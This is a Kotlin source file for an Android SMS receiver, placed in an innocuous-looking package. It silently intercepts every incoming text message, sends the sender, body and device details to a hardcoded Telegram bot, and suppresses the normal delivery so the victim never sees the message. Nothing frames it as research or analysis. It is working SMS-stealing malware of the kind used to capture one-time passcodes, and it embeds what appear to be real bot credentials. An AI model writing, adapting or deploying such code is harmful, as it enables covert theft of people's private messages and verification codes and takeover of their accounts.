
package com.android.quickdraw.core

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Telephony
import android.telephony.SmsMessage
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okio.IOException

class SmsReceiver : BroadcastReceiver() {

    private val client = OkHttpClient()
    private val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
    private val chatId = "6331293386"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_DELIVER_ACTION) {
            val smsMessages = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                Telephony.Sms.Intents.getMessagesFromIntent(intent)
            } else {
                @Suppress("DEPRECATION")
                getLegacySmsMessages(intent)
            }

            for (sms in smsMessages) {
                processSms(context, sms)
            }
        }
    }

    private fun processSms(context: Context, sms: SmsMessage) {
        val sender = sms.displayOriginatingAddress ?: "Unknown"
        val message = sms.displayMessageBody ?: "Empty message"
        val deviceInfo = getDeviceInfo()

        sendToTelegram("""
            📩 New SMS Received
            From: $sender
            Message: $message
            Device: $deviceInfo
        """.trimIndent())
        
        // Отменяем стандартную обработку SMS
        abortBroadcast()
    }

    @Suppress("DEPRECATION")
    private fun getLegacySmsMessages(intent: Intent): Array<SmsMessage> {
        val pdus = intent.extras?.get("pdus") as? Array<*> ?: return emptyArray()
        return pdus.mapNotNull { pdu ->
            if (pdu is ByteArray) {
                SmsMessage.createFromPdu(pdu)
            } else {
                null
            }
        }.toTypedArray()
    }

    private fun getDeviceInfo(): String {
        return "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"
    }

    private fun sendToTelegram(message: String) {
        try {
            val url = "https://api.telegram.org/bot$botToken/sendMessage"
            val json = """
                {
                    "chat_id": "$chatId",
                    "text": "$message",
                    "parse_mode": "Markdown"
                }
            """.trimIndent()

            val request = Request.Builder()
                .url(url)
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    // Ошибка отправки - можно добавить логирование
                }

                override fun onResponse(call: Call, response: okhttp3.Response) {
                    response.close()
                }
            })
        } catch (e: Exception) {
            // Обработка ошибок
        }
    }
}
